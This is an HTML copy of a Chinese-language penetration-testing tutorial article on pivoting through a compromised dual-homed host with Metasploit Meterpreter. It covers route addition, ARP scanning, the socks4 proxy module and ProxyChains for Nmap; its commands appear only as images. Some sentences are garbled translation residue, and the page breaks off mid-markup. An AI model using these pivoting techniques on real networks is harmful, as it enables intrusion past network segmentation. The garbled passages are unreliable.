<html>
<head>
<title>图解Meterpreter实现网络穿透的方法</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
图解Meterpreter实现网络穿透的方法
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                                                                <span class="rich_media_meta rich_media_meta_text">
                                                                    鸢尾
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2018-12-03</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><p style="text-align: center;" data-mpa-powered-by="yiban.io"><img class="" data-copyright="0" data-ratio="0.3188202247191011" data-s="300,640" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/1_aPbK6xQJIHiaUOB16u0KcQnicDG9pg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou85etJYTkncLGY4Biavb6ibNacP7iaHc5fOEUUHZIlTV3uyqOmgKiaPbK6xQJIHiaUOB16u0KcQnicDG9pg/640?wx_fmt=png'" data-type="png" data-w="712" style=""  /></p><p><span style="color: rgb(61, 167, 66);"><strong><span style="font family: 微软雅黑;font-size:15px;line-height:35px;;white-space: pre-wrap;background-color: rgb(255, 255, 255);">纵向防御也被被称为为“多层防御”，这样的概念被运用于“信息安全”上。以多层电脑安全技术去减轻其风险，在其中有些电脑被入侵或是泄密时，风险可大大降低。</span></strong></span></p><p><span style="color: rgb(88, 88, 88);font family: 微软雅黑;font-size:15px;line-height:35px;;white-space: pre-wrap;background-color: rgb(255, 255, 255);"><br  /></span></p><p><span style="color: rgb(88, 88, 88);font family: 微软雅黑;font-size:15px;line-height:35px;;white-space: pre-wrap;background-color: rgb(255, 255, 255);">举例说明，防毒软件被安装于个人工作站上，电脑中病毒在防火墙与服务器等其中类似环境中被拦拦下来。在信息技术世界中占据着举足轻重的地位。本文我们将通过示例分析怎么用英语翻译。是什么意思进行网络穿透的。</span>&nbsp;&nbsp; &nbsp; &nbsp;</p><h2 style="box-sizing: border-box;font family: 微软雅黑;font-weight: bold;line-height: 1.1;color: rgb(38, 38, 38);margin-top: 30px;margin-bottom: 15px;font-size:18px;line-height:38px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">何谓路由</span></a></h2><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">确定设备如何在不同网络之间相互传输的过程，也即通过互联的网络把信息从源地址传输到目的地址的活动被称为为路由。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">通常用于执行路由活动的设备被称为路由器。通过使用路由表，路由器，规划网络包到各自目的地的线路。路由的功能不只是例如路由器等网络设备能够完成，在安装有该功能的任意计算机系统也能够完成。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);text-align: center;"><img data-ratio="0.463768115942029" data-type="jpeg" data-w="690" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/2_fmMunxJ0dXWL3AFfFLRBicBpLsh5lQ.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIib02SyJ4sP1gfqsVGwlKJc2ib820fmMunxJ0dXWL3AFfFLRBicBpLsh5lQ/640?wx_fmt=jpeg'" style="box-sizing: border-box;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;display: inline;width: 100%;height: auto;" width="690"  /></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">根据上图例所选，为了在192.168.1.0/24与192.168.10.0/24网络之间进行通信是需要一个路由表记录的。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">根据路由器中的规则定义，数据需要从192.168.1.0/24源网络发到192.168.10.0/24目的网络中去。网络数据包大概会经历如下过程：</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);text-align: center;"><img data-ratio="0.6480769230769231" data-type="jpeg" data-w="520" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/3_Q2ah8r7DLFJBxBul5Wkxowd22j4EGQ.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIib6FtibWia0fMBEft4rKyXZG98w5Q2ah8r7DLFJBxBul5Wkxowd22j4EGQ/640?wx_fmt=jpeg'" style="box-sizing: border-box;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;display: inline;width: 100%;height: auto;" width="520"  /></p><h2 style="box-sizing: border-box;font family: 微软雅黑;font-weight: bold;line-height: 1.1;color: rgb(38, 38, 38);margin-top: 30px;margin-bottom: 15px;font-size:18px;line-height:38px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">何谓Pivoting</span></h2><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">基本上可以概括为，在正常情况下仅仅只是通过使用被控制的计算机我们可以依旧无法进行网络访问。假设一台被控制的计算机连接有多个网络，将其作为我们的跳板，那么网络隔离的手段对我们来说就形同虚设。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">跟着这个思路，攻击者在被控制的跳板主机上执行路由操作，进而访问隐藏的网络。对新发现网络发起的每个请求都会通过中间的双网卡跳板传输，形象化一点说来就像是洞子一般。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);text-align: center;"><img data-ratio="0.463768115942029" data-type="jpeg" data-w="690" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/4_CFn5Usib3gKDdJibUEcpozl1D9icoQ.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIib3hcOYPbaqIwXxa50sPQejYc0PjQCFn5Usib3gKDdJibUEcpozl1D9icoQ/640?wx_fmt=jpeg'" style="box-sizing: border-box;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;display: inline;width: 100%;height: auto;" width="690"  /></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">就如上面所示的拓扑图，设备有两张网卡可访问192.168.1.0/24以及192.168.10.0/24两个网络。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">在正常情况下，这两个网络之间是不能相互访问的，除非有定义路由规则。根据该结构，授权用户（使用两张网卡的计算机）可访问DMZ区内的一些服务。</span></p><h2 style="box-sizing: border-box;font family: 微软雅黑;font-weight: bold;line-height: 1.1;color: rgb(38, 38, 38);margin-top: 30px;margin-bottom: 15px;font-size:18px;line-height:38px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">拿下第一层双网卡中转跳板及端口转发</span></h2><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">根据我们的攻击场景，先得下命名为RD的主机然后获得到的米翻壳，RD能连接到DMZ网络。随后，在信息收集过程中确定了目标有两张网卡。注意：环境中的路由器在两个网络之间并没有联通。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);text-align: center;"><img data-ratio="0.5620915032679739" data-type="jpeg" data-w="459" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/5_IN4HoricfNBjdZubbUZfge2DIGsrlw.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIibR5HHBwUhJJvpBqwd3icCD8CMc3IN4HoricfNBjdZubbUZfge2DIGsrlw/640?wx_fmt=jpeg'" style="box-sizing: border-box;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;display: inline;width: 100%;height: auto;" width="459"  /></p><p style="text-align: center;"><img data-ratio="0.7437185929648241" data-s="300,640" data-type="png" data-w="597" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/6_u3iaCkBLUmC14A5TlMjIgA2E9V59Rg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIibCl94ibKaPiaWJGXQQNQPBaMTFRGu3iaCkBLUmC14A5TlMjIgA2E9V59Rg/640?wx_fmt=png'" style="width: 100%;height: auto;"  /></p><p><img data-ratio="0.4797979797979798" data-s="300,640" data-type="png" data-w="594" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/7_LIUtgvA5VJicO7WgHNdKEjvuBCnmYg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIibJqNiaABa0Mf78AwZbQJJUj89EiaLIUtgvA5VJicO7WgHNdKEjvuBCnmYg/640?wx_fmt=png'" style="width: 100%;height: auto;"  /></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">在我们设计的这个场景中，获得RD系统访问权限的攻击者将会使用第二张网卡（7.7.7.0/24）访问网络。在执行这项操作之前，攻击者必须先在RD中定义路由规则中。</span></p><p style="box-sizing: border-box;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);margin-bottom: 10px;"><span style="box-sizing: border-box;">在Metasploit中可以轻松完成这项任务，在当前meterpreter会话下键入以下命令可创建路由规则： </span></p><p style="box-sizing: border-box;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);margin-bottom: 10px;"><img data-ratio="0.38813559322033897" data-s="300,640" data-type="png" data-w="590" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/8_cxP3mQYNpaqOsrJHmLnfP8wHszufHw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIibF7vlV9Uc9aYyr1kRCe9S2jI4icxP3mQYNpaqOsrJHmLnfP8wHszufHw/640?wx_fmt=png'" style="text-align: center;"  /></p><p style="box-sizing: border-box;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);margin-bottom: 10px;"><span style="box-sizing: border-box;">根据定义的路由规则，只要Meterpreter就会ID值为2的会话在运行，那么在Metasploit的框架中就可以访问7.7.7.0/24网络。</span></p><p style="box-sizing: border-box;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);margin-bottom: 10px;"><span style="box-sizing: border-box;">这一步骤之后，使用类似arp_scanner的端口模块就能检测到JC系统的IP地址.JC为7.7.7.20内网中的另一台计算机。</span></p><p style="box-sizing: border-box;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);margin-bottom: 10px;"><img data-ratio="0.2835314091680815" data-s="300,640" data-type="png" data-w="589" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/9_yGzt5iaPUftVCdch7rhZRRyQibz40A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIibwQ7TlUTdv6U3F7YMmerWvjINVXyGzt5iaPUftVCdch7rhZRRyQibz40A/640?wx_fmt=png'" style="text-align: center;"  /></p><p><span style="background-color: rgb(255, 255, 255);color: rgb(88, 88, 88);font family: 微软雅黑;font-size:15px;line-height:35px;;text-align: center;white-space: pre-wrap;">在7.7.7.0/24网络中存活系统的IP地址，包括命名为JC的系统主机，都已经检测到了。</span><br  /></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);text-align: center;"><img data-ratio="0.3710144927536232" data-type="jpeg" data-w="690" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/10_zdd1uk8MVuShrBwawXfpLgSNYMfKag.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIibicjMicFYqAQtBvfoSqJvOJTg5Xzdd1uk8MVuShrBwawXfpLgSNYMfKag/640?wx_fmt=jpeg'" style="box-sizing: border-box;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;display: inline;width: 100%;height: auto;" width="690"  /></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">自然而然的，我们想到了以下问题：such such arp_scanner的端口模块对这些类型的扫描工作可能存在着不足之处，那么nmap风格的扫描工具是否能登场呢？</span></p><h2 style="box-sizing: border-box;font family: 微软雅黑;font-weight: bold;line-height: 1.1;color: rgb(38, 38, 38);margin-top: 30px;margin-bottom: 15px;font-size:18px;line-height:38px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">通过中转跳板进行Nmap扫描</span></h2><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">对此必须在Metasploit中激活路由配置，并且该配置必须能够通过socks4代理进行转发。这里有一个metasploit模块刚好满足以上需求。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">使用metasploit的socks4代理模块： </span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><img data-ratio="0.5701530612244898" data-s="300,640" data-type="png" data-w="784" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/11_GrWh1fc5AEicCeONpNWZhg1ReaeEbQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIibkBX4TXZ9u26K3QJrxYul6ezWQGrWh1fc5AEicCeONpNWZhg1ReaeEbQ/640?wx_fmt=png'" style="text-align: center;"  /></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">ProxyChains是为GNU \ Linux操作系统而开发的工具，任何TCP连接都可以通过TOR或者SOCKS4，SOCKS5，HTTP / HTTPS路由到目的地。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">在这个通道技术中可以使用多个代理服务器。除此之外提供匿名方式，诸如用于中转跳板的应用程序也可以用于对发现的新网络进行直接通信。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);text-align: center;"><img data-ratio="0.25072463768115943" data-type="jpeg" data-w="690" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/12_SAKicgVbphX8XUwKXISF7ic9J0Trbg.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIibl8Z2QxpAyI2Z7lWVJEFibbB6skQSAKicgVbphX8XUwKXISF7ic9J0Trbg/640?wx_fmt=jpeg'" style="box-sizing: border-box;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;display: inline;" width="690"  /></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;">用文本编辑器打开/etc/proxychains.conf，在文件的最后一行添加新创建的socks4代理服务器。</span></p><p style="box-sizing: border-box;margin-bottom: 10px;font-size:15px;line-height:35px;;line-height: 26px;word-wrap: break-word;word-break: break-all;white-space: pre-wrap;color: rgb(88, 88, 88);font family: 微软雅黑;background-color: rgb(255, 255, 255);"><img data-ratio="0.1925207756232687" data-s="300,640" data-type="png" data-w="722" src="图片/HACK学习呀_2018-12-03_图解Meterpreter实现网络穿透的方法/13_Ioib8eFQPofJf6wxFfJq5VwqLtNOhA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR39MhbF7cKdPYdHaYzuXZPIibkQluZte2AGoU3MY7dMbwhmcm8Ioib8eFQPofJf6wxFfJq5VwqLtNOhA/640?wx_fmt=png'" style="text-align: center;"  /></p><p style="box-sizing: border-box;margin-bottom: 